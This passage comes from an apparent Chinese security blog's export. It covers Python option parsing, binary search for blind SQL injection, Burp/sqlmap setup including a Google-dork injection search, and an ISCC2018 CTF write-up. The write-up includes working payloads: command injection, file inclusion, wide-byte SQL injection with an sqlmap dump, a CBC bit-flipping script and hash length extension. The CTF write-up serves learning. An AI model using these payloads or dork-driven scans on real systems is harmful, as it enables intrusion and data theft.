(options,args)=parser.parse_args(args) &gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args) {&apos;url&apos;: None},[] &gt;&gt;&gt; 实例2.action的值为store_true &gt;&gt;&gt; from optparse import OptionParser &gt;&gt;&gt; parser=OptionParser() &gt;&gt;&gt; parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;--dbs&quot;) &lt;Option at 0x2316048: --dbs&gt; &gt;&gt;&gt; args=[&quot;--dbs&quot;] &gt;&gt;&gt; (options,args)=parser.parse_args(args) &gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args) {&apos;dbs&apos;: True},[] &gt;&gt;&gt; print options.dbs True &gt;&gt;&gt; args=[] &gt;&gt;&gt; (options,args)=parser.parse_args(args) &gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args) {&apos;dbs&apos;: None},[] &gt;&gt;&gt; print options.dbs None &gt;&gt;&gt; args=[&quot;-h&quot;] &gt;&gt;&gt; (options,args)=parser.parse_args(args) Usage: [options] Options: -h, --help show this help message and exit --dbs --dbs G:\\代码&gt;","categories":[{"name":"python编程","slug":"python编程","permalink":"http://yoursite.com/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"python有序二分查找算法","slug":"pybinarysearch","date":"2018-06-04T15:35:01.833Z","updated":"2018-06-05T09:08:57.495Z","comments":true,"path":"2018/06/04/pybinarysearch/","link":"","permalink":"http://yoursite.com/2018/06/04/pybinarysearch/","excerpt":"python有序二分查找算法感觉自己的博客更新的很慢，看到自己博客不更新文章的话总会很焦虑，因为总想写点有意义的技术文章，但是想了想，博客本来就是一个记录知识的地方，将自己学习的过程记录下来也是个不错的选择，即使是一个小知识点也值得记录，以便以后不会忘记，所以以后博客的更新次数应该会很频繁，博客的日志是时候该充实一下了。写给自己，迷茫的时候多研究点知识，多写博客总结，知识需要不断沉淀 记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求","text":"python有序二分查找算法感觉自己的博客更新的很慢，看到自己博客不更新文章的话总会很焦虑，因为总想写点有意义的技术文章，但是想了想，博客本来就是一个记录知识的地方，将自己学习的过程记录下来也是个不错的选择，即使是一个小知识点也值得记录，以便以后不会忘记，所以以后博客的更新次数应该会很频繁，博客的日志是时候该充实一下了。写给自己，迷茫的时候多研究点知识，多写博客总结，知识需要不断沉淀 记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求 二分查找算法代码首先需要给定一个查找的范围，也就是区域。其次要求被查找的列表是有序的，贴出代码 #coding=utf-8 def binary_search(sealist,find): low=0 high=len(sealist) while low&lt;=high: mid=(low+high)/2 if find==sealist[mid]: return mid elif find&lt;sealist[mid]: high=mid-1 elif find&gt;sealist[mid]: low=mid+1 else: return -1 sealist=range(0,1000) find=input(&quot;please input a number:&quot;) result=binary_search(sealist,find) if result&gt;=0: print &quot;Catch Element %s! Position:%s!&quot;%(str(find),str(result+1)) else: print &quot;Sorry,The Element Not Found.&quot; 利用二分法通过不断地缩小查找区域最终锁定查找的内容，二分法相比于普通的循环自增查找，查找次数减少了很多，速度自然提升了不少。举个例子，如果采用自增查找的方式，在0-1000列表中查找到100的位置需要101次，但是上面的代码利用了有序二分查找到100的位置只需要7次","categories":[{"name":"python编程","slug":"python编程","permalink":"http://yoursite.com/categories/python编程/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/tags/算法/"}]},{"title":"burpsuite中配置使用sqlmapapi","slug":"BurpSQLiPY","date":"2018-06-03T09:43:56.948Z","updated":"2018-06-03T13:03:49.030Z","comments":true,"path":"2018/06/03/BurpSQLiPY/","link":"","permalink":"http://yoursite.com/2018/06/03/BurpSQLiPY/","excerpt":"burpsuite中配置使用sqlmapapiburpsuite的Extender中有很多有用的扩展插件可以方便安全人员渗透测试，其中一个名为SQLiPY的插件可以直接在burpsuite中调用sqlmapapi进行测试，自己在安装这个插件的时候遇到了很多坑，属于那种百度谷歌都查不出解决方案的问题。最终终于捣腾出来了，在这记录一下","text":"burpsuite中配置使用sqlmapapiburpsuite的Extender中有很多有用的扩展插件可以方便安全人员渗透测试，其中一个名为SQLiPY的插件可以直接在burpsuite中调用sqlmapapi进行测试，自己在安装这个插件的时候遇到了很多坑，属于那种百度谷歌都查不出解决方案的问题。最终终于捣腾出来了，在这记录一下 SQLiPY插件安装打开burpsuite,在Extender模块中的BApp Store中找到SQLiPY插件可以看到安装该插件需要的环境 Jython 2.7.0 or newer Java 1.7 or 1.8 (the beta version of Jython 2.7 requires this). Python 2 (already installed on most Unix distributions) java和python环境都有了，还需要Jython2.7.0或者更新的，去Jython官网下载一个jar包即可可以看到关于Jython2.7.0版本官网上有两个地方可以下载，第一个jar需要安装，英文意思是安装可以执行jar的jython，但是自己安装后在burpsuite中导入jython.jar去安装SQLiPY后会报出Cannot create PyString with non-byte value的错误，也就是SQLiPY插件虽然下载成功但是无法导入进burpsuite，问了很多同学，有的人安装完成导入后并不会报错，但是有的人就是会报错，我就属于会报错的那种，解决方案也很简单注意在这下载第二个jar包英文意思是在java应用程序中嵌入Jython,这个jar包不需要安装，直接导入即可，在Extender模块中的Options中的Python Environment中，可以将下载的jar包导入到burpsuite中然后就可以在BApp Store安装SQLiPY这个插件了，安装过程比较久，但是可以安装成功，注意安装的SQLiPY.py会默认在计算机的用户目录下，所以目录名里不能有中文和引号等字符，不然会在burpsuite导入SQLiPY插件时出现java报错，之前我的计算机用户里面有个引号就加载不进来，所以这一点要十分注意 SQLiPY插件的使用这个插件确实很强大方便，可以在渗透测试的时候直接在burpsuite中通过sqlmapapi使用sqlmap 首先在该插件下选择python.exe之后点击Start API就可以启动API使用这个插件了，用burpsuite抓包时看到一个可能存在注入的参数，可以右键SQLiPY Scan直接将数据包发给SQLiPY插件，使用sqlmap去测试该注入点如果存在注入，就会在Scanner模块中显示出来","categories":[{"name":"工具使用","slug":"工具使用","permalink":"http://yoursite.com/categories/工具使用/"}],"tags":[{"name":"burpsuite","slug":"burpsuite","permalink":"http://yoursite.com/tags/burpsuite/"}]},{"title":"解决sqlmap不能使用-g的问题","slug":"sqlmapgsearch","date":"2018-06-02T03:33:04.780Z","updated":"2018-06-04T15:14:02.931Z","comments":true,"path":"2018/06/02/sqlmapgsearch/","link":"","permalink":"http://yoursite.com/2018/06/02/sqlmapgsearch/","excerpt":"解决sqlmap不能使用-g的问题sqlmap的-g参数的功能可以自动的使用google语法搜索注入点进行注入 之前使用赛风vpn时sqlmap的-g是可以用的，但是由于之后换成了shadowsocks后发现-g功能不能用了，百度谷歌都没有搜到这个问题的解决办法，将我的结果方案写到这里","text":"解决sqlmap不能使用-g的问题sqlmap的-g参数的功能可以自动的使用google语法搜索注入点进行注入 之前使用赛风vpn时sqlmap的-g是可以用的，但是由于之后换成了shadowsocks后发现-g功能不能用了，百度谷歌都没有搜到这个问题的解决办法，将我的结果方案写到这里可以看到sqlmap -g不能使用 我的ss客户端为本地1088端口，使用sqlmap -g时指定本地的ss端口作为代理即可 sqlmap -g &quot;inurl:php?id=&quot; --proxy &quot;http://127.0.0.1:1088&quot; 可以看到此时sqlmap的谷歌语法搜索注入点便可以使用了。这是sqlmap的一个很强大的功能","categories":[{"name":"工具使用","slug":"工具使用","permalink":"http://yoursite.com/categories/工具使用/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"http://yoursite.com/tags/sqlmap/"}]},{"title":"ISCC2018 write up","slug":"iscc2018","date":"2018-05-25T12:04:18.581Z","updated":"2018-06-04T15:04:26.787Z","comments":true,"path":"2018/05/25/iscc2018/","link":"","permalink":"http://yoursite.com/2018/05/25/iscc2018/","excerpt":"ISCC2018 write up简介参加2018年的ISCC竞赛，将做出的题记录到这里,记录一下思路，沉淀一下","text":"ISCC2018 write up简介参加2018年的ISCC竞赛，将做出的题记录到这里,记录一下思路，沉淀一下 Web方向比较数字大小HINT：只要比服务器上的数字大就好了发现题目只有一个输入框，限制只能输入3个字符，于是firebug查看元素，发现maxlength值为3，将3改为100，随意输入个大数字，flag就出来了flag:key is 768HKyu678567&amp;*&amp;K 本地的诱惑HINT：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题） 该题为web的签到题，打开后发现是这样的必须从本地访问，于是想到了伪造X-Forwarded-For，后来发现直接访问源代码就能得到flag，果然是签到题啊flag:ISCC{^&amp;*(UIHKJjkadshf} 你能跨过去吗？HINT:如果你对xss了解的话,那你一定知道key是什么了，加油！看到xss便首先尝试在输入框里提交XSSPaylaod，结果发现根本找不到输出点，不管提交多少次都是”加油再试一次”，然后发现页面有一串字符非常像base64编码ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0base64解码了一下，发现是XSSpayload，里面有我们要的key因为key的16进制中有00，代表结束符（截断），所以要将key中的00字符都删掉，才能将key复制下来key:/%nsfocusXSStest%/ key不是flag，将/%nsfocusXSStest%/提交到页面输入框才能弹出来flag建议出题人将这题放到杂项会比较合适，有点挂羊头卖狗肉的意思 flag{Hell0World} 一切都是套路HINT：好像有个文件忘记删了 自己的字典太垃圾，啥也没扫出来，经过一个表哥强大的字典发现扫出了index.php.txt，内容如下 &lt;?php include &quot;flag.php&quot;; if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;) die(&quot;flag is here&quot;); if (!isset($_POST[&quot;flag&quot;]) ) die($_403); foreach ($_GET as $k =&gt; $v){ $$k = $$v; } foreach ($_POST as $k =&gt; $v){ $$k = $v; } if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403); echo &quot;flag: &quot;. $flag . &quot;\\n&quot;; die($_200); ?&gt; 进行一波代码审计发现考察的是php变量覆盖，构造payloadhttp://118.190.152.202:8009/index.php?_200=flag 带上POST参数 flag=我来讲解一下详细的过程，首先代码要求必须有POST参数，而且POST参数的参数名必须为flag，这样才可以到变量覆盖的那一步,接着提交GET参数_200=flag,php代码遍历$_GET数组执行的便是$_200=$flag,也就是将变量$flag的值复制给$_200,覆盖原先变量$_200的值,此时变量$_200的值为$flag中的值，接着php遍历$_POST数组，我们提交的POST参数为flag=空(任意值)，于是将POST的值复制给$flag值，覆盖原先的$flag值，$_POST[&quot;flag&quot;]便会和$flag值相等，都为空(任意值)，最后输出变量$_200的值，也就是原先$flag中的flag flag: ISCC{taolu2333333....} 你能绕过吗?HINT:没过滤好啊http://118.190.152.202:8008/index.php?f=articles&amp;id=1 一开始以为id参数没过滤好，于是尝试了注入，结果被坑了，原来是f参数没过滤好，存在文件包含，通过文件包含漏洞使用php伪协议读取index.php payload:http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=1payload中的php要大写，否则会被拦截得到一串base64，解码得到源码，源码中有flagflag:ISCC{LFIOOOOOOOOOOOOOO} web02要求ip为本机ip，尝试Referer和X-forwarded-For都不行，最后搜索了一番，发现伪造ip还可以用Client-ip 将ip伪造成127.0.0.1即可 flag:ISCC{iscc_059eeb8c0c33eb62} 请ping我的ip 看你能Ping通吗？HINT:我都过滤了，看你怎么绕。看到这样一句话：请ping我的IP 看你会ping通吗 尝试 http://118.190.152.202:8018/?ip=118.190.152.202 发现可以执行ping命令猜测后台php代码应该如下,类似于dvwa中的命令执行 shell_exec( &#39;ping &#39; . waf($_GET[ip]) )尝试在ping命令后执行多条命令，发现&amp;，&amp;&amp;，|都不行，最后测试发现使用%0A可以绕过,读取flag.txt payload http://118.190.152.202:8018/?ip=www.baidu.com%0Acat%20flag.txt读取index.php payloadhttp://118.190.152.202:8018/?ip=www.baidu.com%0Acat%20index.php可以看到源码里正如我们之前猜测的那样 请ping我的IP 看你会ping通吗 PING www.a.shifen.com (180.149.132.151) 56(84) bytes of data. 64 bytes from 180.149.132.151: icmp_seq=1 ttl=51 time=23.8 ms --- www.a.shifen.com ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 23.871/23.871/23.871/0.000 ms &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;|&apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 1 &apos; . $target ); } echo &quot; {$cmd} &quot;; ?&gt; 当然这到题也有非常规解法，既然要用命令执行去读取flag.txt，不如直接访问网站根目录下的flag.txt就能得到flagISCC{8a8646c7a2fce16b166fbc68ca65f9e4} Please give me username and password!题目说Please give me username or password! 那在url后添加GET参数username与passwordhttp://118.190.152.202:8017/?username=&amp;&amp;password= 再查看源代码可以看到html注释里面有个index.php.txt 访问index.php.txt,发现源代码，又是一道代码审计题 &lt;?php error_reporting(0); $flag = &quot;***********&quot;; if(isset($_GET[&apos;username&apos;])){ if (0 == strcasecmp($flag,$_GET[&apos;username&apos;])){ $a = fla; echo &quot;very good!Username is right&quot;; } else{ print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;} }else print &apos;Please give me username or password!&apos;; if (isset($_GET[&apos;password&apos;])){ if (is_numeric($_GET[&apos;password&apos;])){ if (strlen($_GET[&apos;password&apos;]) &lt; 4){ if ($_GET[&apos;password&apos;] &gt; 999){ $b = g; print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;; }else print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;; }else print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;; }else print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;; } if ($a.$b == &quot;flag&quot;) print $flag; ?&gt; 可以看到只要绕过对username和password的过滤便能得到flag strcasecmp的绕过可以利用数组，因为php的隐式类型转换的特性，strcasecmp这个函数在比较时会发生隐式类型转换，数组会被转为字符串格式，也就是Array，所以两个字符串不相等，那么该函数就会返回False，又因为将False与0以双等号（不严格的比较）进行比较发生了一次隐私类型转换，所以结果为真，从而绕过，后面要求数字长度小于4且大于999可以用php中的科学计数法绕过,构造payload http://118.190.152.202:8017/?username[]=&amp;&amp;password=1e9flag{ISCC2018_Very_GOOD!} SQL注入的艺术找到一个可能存在注入的连接http://118.190.152.202:8015/index.php?id=1 猜测id参数可能存在注入，加单引号和双引号页面均返回正常并不会报错，于是猜测引号可能被转义了，尝试宽字节注入 http://118.190.152.202:8015/index.php?id=1%df&#39; 发现页面返回不正常and逻辑判断确认存在注入 http://118.190.152.202:8015/index.php?id=1%df&#39; and 1=1%23http://118.190.152.202:8015/index.php?id=1%df&#39; and 1=2%23order by 测试出列数为8，union查询确定出注入回显的位置 http://118.190.152.202:8015/index.php?id=-1%df&#39; union select 1,2,3,4,5,6,7,8%23接下来可以union手工注入，也可以用sqlmap跑，sqlmap跑的时候要使用tamper脚本unmagicquotes.py来绕过单引号转义过滤，为了方便直接上sqlmap，获取flag的命令 sqlmap.py -u &quot;http://118.190.152.202:8015/index.php?id=1&#39;&quot; --dump -C &quot;flag&quot; -T &quot;admins&quot; -D &quot;baji&quot; --tamper=&quot;unmagicquotes.py&quot;flag:Y0u_@@33w_dxxmn_9rf0Od 试试看HINT:随意开火这道题一开始就觉得是文件包含，但是使用php协议读文件时发现一直出现File not found，一直不知为何，直到谷歌搜出了类似的一道题才找到思路，这里的思路大概一样，只要绕过正则表达式即可，经过模糊测试，发现 http://118.190.152.202:8006/show.php?img=php://filter/convert.base64-encode/resource=1.jpgresource=../flag.php可以读到flag.php中的flagflag{1ntere5ting_PHP_Regu1ar_express1onssssss}http://118.190.152.202:8006/show.php?img=php://filter/convert.base64-encode/resource=1.jpgresource=show.php可以读取show.php查看它的过滤 &lt;?php error_reporting(0); ini_set(&apos;display_errors&apos;,&apos;Off&apos;); include(&apos;config.php&apos;); $img = $_GET[&apos;img&apos;]; if(isset($img) &amp;&amp; !empty($img)) { if(strpos($img,&apos;jpg&apos;) !== false) { if(strpos($img,&apos;resource=&apos;) !== false &amp;&amp;preg_match(&apos;/resource=.*jpg/i&apos;,$img) === 0) { die(&apos;File not found.&apos;); } preg_match(&apos;/^php:\\/\\/filter.*resource=([^|]*)/i&apos;,trim($img),$matches); if(isset($matches[1])) { $img = $matches[1]; } header(&apos;Content-Type: image/jpeg&apos;); $data = get_contents($img); echo $data; } else { die(&apos;File not found.&apos;); } } else { ?&gt; &lt;img src=&quot;1.jpg&quot;&gt; &lt;?php } ?&gt; 可以看到源码印证了我们之前的猜想 Only admin can see flag打开后是一个登陆页面出于习惯首先查看源代码，结果发现泄露了index.php的源码查看源代码，可以看出又是一道代码审计题代码如下 &lt;?php include &apos;sqlwaf.php&apos;; define(&quot;SECRET_KEY&quot;, &quot;................&quot;); define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); session_start(); function get_random_iv(){ $iv=&apos;&apos;; for($i=0;$i&lt;16;$i++){ $iv.=chr(rand(1,255)); } return $iv; } function login($info){ $iv=get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher)); } function show_homepage(){ if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;){ echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;; }else{ echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;; } echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;; die(); } function check_login(){ if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])){ $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; }else{ die(&quot;ERROR!&quot;); } } } if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) { $username=waf((string)$_POST[&apos;username&apos;]); $password=waf((string)$_POST[&apos;password&apos;]); if($username === &apos;admin&apos;){ exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;); }else{ $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); } } else{ if(isset($_SESSION[&quot;username&quot;])){ check_login(); show_homepage(); } } ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot; &gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Paper login form&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;login&quot;&gt; &lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;h1&gt;Sign In&lt;/h1&gt; &lt;input name=&apos;username&apos; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt; &lt;input name=&apos;password&apos; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt; &lt;button&gt;Sign in&lt;/button&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 来看代码的主要执行过程与用户数据流的流向 首先，如果存在有用户POST传递过来的username与password，那就接收用户输入的username与password，将用户输入的内容转换为字符串类型然后带入waf函数进行过滤检查处理（应该是过滤一些危险字符），之后使用===检查username的值是否为admin，如果相等直接输出You are not real admin!到页面并且结束，否则将username与password存入数组然后带入login函数，通过代码可以看出login函数的主要作用，将传入的存有username与password的数组进行序列化处理后再使用php中的openssl_encrypt函数进行aes-128-cbc加密，加密的初始化向量为随机生成的16字节的字符串，之后将传入的用户名传入服务器中session文件（文件名为28r835361idfvf2g5judamo844）中的username变量中，将初始化向量与加密结果进行base64编码后分别存入cookie中的iv与cipher中，之后cookie就作为该用户的登陆凭证，简单来说，就是如果用户名不等于admin就登陆成功并且将用户名存入服务器的session变量中，之后setcookie，然后进入用户界面，此处使用show_homepage函数判断，这个函数会判断session中的username是否为admin，如果为admin，那就登陆成功并输出flag，否则就以普通用户登录 如果发现服务器session文件中的username变量已被设置，说明之前有用户登录了，就不使用login函数进行进行登陆检查，而是使用check_login函数进行用户身份检查，通过代码可以看出check_login函数的主要作用，检查cookie中是否设置有cipher和iv，如果有，就对cookie中的cipher与iv进行base64解码，然后使用php中的openssl_decrypt函数进行aes-128-cbc解密，将解密的结果进行反序列化处理为数组，之后将数组中的username赋值给session中的username，之后进入用户登录界面，再次调用show_homepage 来分析一下整个逻辑过程 简单来说，要求输入的用户名不能为admin才能登陆成功，但是进行用户身份检查时需要$_SESSION中的username必须等于admin才能登陆成功，于是想到了可以首先以一个用户名不是admin的用户登录，设置$_SESSION[&#39;username&#39;]，之后刷新登陆页面，将会带上生成的cookie进入check_login函数,我们可以修改cookie中的cipher与iv，使其经过aes-128-cbc解密反序列化后将$info[&#39;username&#39;]的值变为admin即可覆盖第一次登陆后设置的$_SESSION[&#39;name&#39;]，将其变为admin,此时经过show_homepage后就会是admin并且输出flag 在这里加密解密的密钥是未知的，iv初始化向量是随机生成的，导致我们不能直接利用加密算法生成cookie，于是想到了一种名为CBC翻转字节攻击的方法，该攻击可以在不知道密钥的前提下，通过修改密文中某一处的字节达到修改部分明文的目的，具体过程如下，首先来看AES的CBC模式的加密解密过程，分组长度为16字节 加密解密所谓的CBC翻转字节攻击就是通过修改某一分组的密文，去修改其下一分组的明文比如明文分组如下，以题目举例 a:2:{s:8:&quot;userna me&quot;;s:5:&quot;Admin&quot;; s:8:&quot;password&quot;;s :6:&quot;123456&quot;;} 要将Admin修改为admin，只需修改加密后第一个分组中的第10个字节，也就是对应A所在位置的&quot;的密文就可以 首先要以Admin登陆，获取Set-Cookie中的cipher与iv，cipher里面存放着将上面那串字符串加密的密文，iv为随机生成的16位字符串，作为加密解密的初始化向量 iv：pO%2FPPYF9sNQq9oGENmDdFA%3D%3D cipher：bq1cO9PgjsrNX%2B1iItSFPsyT%2Ftaue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7%2FDu5pSgPzuq339vT4EWNfQ%3D%3D 首先修改密文的第一个分组的第十个字节 import urllib import base64 #a:2:{s:8:&quot;userna #me&quot;;s:5:&quot;Admin&quot;; #s:8:&quot;password&quot;;s #:6:&quot;123456&quot;;} cipher=&quot;bq1cO9PgjsrNX%2B1iItSFPsyT%2Ftaue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7%2FDu5pSgPzuq339vT4EWNfQ%3D%3D&quot; cipher=base64.b64decode(urllib.unquote(cipher)) newcipher=cipher[0:9]+chr(ord(cipher[9])^ord(&apos;A&apos;)^ord(&apos;a&apos;))+cipher[10:] print &quot;cipher:\\n%s&quot;%(urllib.quote(base64.b64encode(cipher))) print &quot;new cipher:\\n%s&quot;%(urllib.quote(base64.b64encode(newcipher))) 我来解释一下这段代码 首先需要明白一个前提 异或运算相同为0，不同为1，所以推导出：一个字符和其本身异或结果为0，一个字符和0异或结果为其本身 解密（cipher[9+16]）^cipher[9]=&apos;A&apos;(这是正常的解密过程) 解密（cipher[9+16]）^cipher[9]^&apos;A&apos;^&apos;a&apos;=&apos;a&apos;（将A变为a，就要将第一分组中的第十个字节cipher[9]进行cipher[9]^&apos;A&apos;^&apos;a&apos;改变） 此时cipher变为了 bq1cO9PgjsrNf%2B1iItSFPsyT/taue76NjOh1oAZOMHsVI74GT7iCFIeGBksNNh%2B7/Du5pSgPzuq339vT4EWNfQ%3D%3D 刷新登陆后的页面，将cookie中的cipher改为修改后的cipher将返回base64_decode(&#39;sMqpNX2y/F9xcy6m4U9Nsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&#39;) can&#39;t unserialize的错误，因为如果修改第一组密文中的某个字节，初始化向量不变也会导致第一组明文解密时发生改变，从而导致解密出的序列化的格式发生改变而导致反序列化失败，所以还要根据这串返回的base64重新生成新的iv，让解密出的第一个分组的明文还原成原先的明文 import urllib import base64 iv=&quot;pO%2FPPYF9sNQq9oGENmDdFA%3D%3D&quot; iv=base64.b64decode(urllib.unquote(iv)) jiamingwen = base64.b64decode(urllib.unquote(&apos;sMqpNX2y/F9xcy6m4U9Nsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&apos;)) mingwen = &apos;a:2:{s:8:&quot;userna&apos; newiv = &apos;&apos; for i in range(0,16): newiv += chr(ord(mingwen[i])^ord(jiamingwen[i])^ord(iv[i])) print urllib.quote(base64.b64encode(newiv)) 同样的，解释一下这段代码 有个前提 如果c=a^b 那么a=c^b，b=a^c 因为： iv^解密（假密文）=假明文 iv^解密（假密文）^假明文=0(假明文^假明文=0) 所以： iv^解密（假密文）^假明文^明文=明文（0^明文=明文） 又因为需要达到： newiv^解密（假密文）=明文 所以： newiv=iv^假明文^明文 所以新的iv变为 dR9UMoe8drNhp9pRsl3%2Bxw%3D%3D 然后将cookie中的cipher和iv同时改为新生成的即可，这样的话解密后只会将第二组明文的A变为a，而且第一分组解密出的明文并不会发生改变，序列化格式也自然不会改变，这样就可以反序列化成功，然后将$_SESSION[&#39;username&#39;]重新赋值为解密出的admin明文,然后绕过验证输出flag flag：ISCC{123dasd89as10aas} CollideHINT：那么长的秘钥，要爆破到什么时候啊又是一到代码审计题 &lt;?php include &quot;secret.php&quot;; @$username=(string)$_POST[&apos;username&apos;]; function enc($text){ global $key; return md5($key.$text); } if(enc($username) === $_COOKIE[&apos;verify&apos;]){ if(is_numeric(strpos($username, &quot;admin&quot;))){ die($flag); } else{ die(&quot;you are not admin&quot;); } } else{ setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7); setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7); } show_source(__FILE__); 可以看出这道题是考察hash长度扩展攻击的，对于这种攻击方式原理自己还没有完全搞懂，于是就把做题方法记录一下 首先，需要在linux中安装一个名为HashPump的工具，HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。下面是安装方法 git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make install 之后POST提交username为guest，运行hashpump，将burp抓包抓到的cookie中的verify与len输入，然后输入数据和要追加的数据（guest与admin）之后便会生成新的数据与hash值，分别将username与cookie中的verify改为hashpump新生成的值即可 flag：ISCC{MD5_1s_n0t_5afe} php是世界上最好的语言打开后可以看到代码如下 &lt;html&gt; &lt;body&gt; &lt;form action=&quot;md5.php&quot; method=&quot;post&quot; &gt; 用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt; 密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt; &lt;input type=&quot;submit&quot; &gt; &lt;/body&gt; &lt;/html&gt; &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;])){ $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; } else{ $username=&quot;hello&quot;; $password=&quot;hello&quot;; } if(md5($password) == 0){ echo &quot;xxxxx&quot;; } show_source(__FILE__); ?&gt; 这里考察php的隐式类型转换，如果用双等号将一个字符串与数字进行比较时，会将字符串类型转为数字类型，所以在这里一般可以利用开头为0的MD5值绕过，以下列举了一些MD5后开头为0的字符串 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 